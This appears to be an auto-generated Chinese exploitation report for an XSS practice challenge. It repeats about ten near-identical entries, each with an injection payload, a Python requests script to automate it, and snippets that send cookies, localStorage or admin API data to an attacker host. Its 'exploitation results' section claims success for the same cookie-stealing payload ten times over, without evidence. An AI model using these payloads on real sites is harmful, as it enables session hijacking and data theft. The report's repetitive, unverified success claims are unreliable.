# 漏洞扫描和利用报告

## 发现的漏洞
### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: high
- 验证载荷: <script>alert(1)</script>
- 修复建议: 对所有用户输入进行HTML编码，使用现代框架的XSS防护机制，实施内容安全策略(CSP)

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <script>alert(1)</script>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<script>alert(1)</script>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: high
- 验证载荷: <img src=x onerror=alert(1)>
- 修复建议: 对所有用户输入进行HTML编码，使用现代框架的XSS防护机制，实施内容安全策略(CSP)

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <img src=x onerror=alert(1)>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<img src=x onerror=alert(1)>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: high
- 验证载荷: "><script>alert(1)</script>
- 修复建议: 对所有用户输入进行HTML编码，使用现代框架的XSS防护机制，实施内容安全策略(CSP)

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   "><script>alert(1)</script>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '"><script>alert(1)</script>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: critical
- 验证载荷: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 修复建议: 实施严格的输入验证，使用HTML编码，实施CSP策略，定期清理存储的数据

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: critical
- 验证载荷: <svg onload=alert(document.domain)>
- 修复建议: 实施严格的输入验证，使用HTML编码，实施CSP策略，定期清理存储的数据

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <svg onload=alert(document.domain)>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<svg onload=alert(document.domain)>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: critical
- 验证载荷: <img src=x onerror=fetch('/api/admin_data').then(r=>r.text()).then(t=>fetch('http://attacker.com/?d='+btoa(t)))>
- 修复建议: 实施严格的输入验证，使用HTML编码，实施CSP策略，定期清理存储的数据

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <img src=x onerror=fetch('/api/admin_data').then(r=>r.text()).then(t=>fetch('http://attacker.com/?d='+btoa(t)))>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<img src=x onerror=fetch('/api/admin_data').then(r=>r.text()).then(t=>fetch('http://attacker.com/?d='+btoa(t)))>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: medium
- 验证载荷: <script>alert(1)</script>
- 修复建议: 对用户输入进行HTML编码，使用现代框架的XSS防护机制

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <script>alert(1)</script>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<script>alert(1)</script>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: medium
- 验证载荷: <img src=x onerror=alert(1)>
- 修复建议: 对用户输入进行HTML编码，使用现代框架的XSS防护机制

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <img src=x onerror=alert(1)>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<img src=x onerror=alert(1)>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: medium
- 验证载荷: <svg onload=alert(1)>
- 修复建议: 对用户输入进行HTML编码，使用现代框架的XSS防护机制

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   <svg onload=alert(1)>
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': '<svg onload=alert(1)>'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

### XSS 漏洞
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 严重程度: medium
- 验证载荷: javascript:alert(1)
- 修复建议: 对用户输入进行HTML编码，使用现代框架的XSS防护机制

#### 攻击指导
1. 手动攻击步骤：
   - 访问目标URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
   - 在参数 keyword 中注入以下payload:
   ```javascript
   javascript:alert(1)
   ```
2. 自动化攻击：
   ```python
   import requests
   url = 'https://xss-challenge-tour.bachang.org/level3.php?writing=wait'
   params = {'keyword': 'javascript:alert(1)'}
   response = requests.get(url, params=params)
   ```

3. 高级利用：
   ```javascript
   // 窃取Cookie
   <script>fetch('http://攻击者服务器/collect?cookie='+document.cookie)</script>
   // 窃取LocalStorage
   <script>fetch('http://攻击者服务器/collect?data='+JSON.stringify(localStorage))</script>
   ```

## 漏洞利用结果
### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

### XSS 漏洞利用
- URL: https://xss-challenge-tour.bachang.org/level3.php?writing=wait
- 参数: keyword
- 使用的Payload: <script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
- 利用结果: 成功注入XSS payload，等待数据回传

## 免责声明
本报告中的攻击方法仅用于授权的安全测试和研究目的。
在使用这些方法之前，请确保：
1. 您有明确的授权许可
2. 仅在测试环境或授权范围内使用
3. 不要对未授权的目标使用这些方法
4. 遵守相关法律法规和道德准则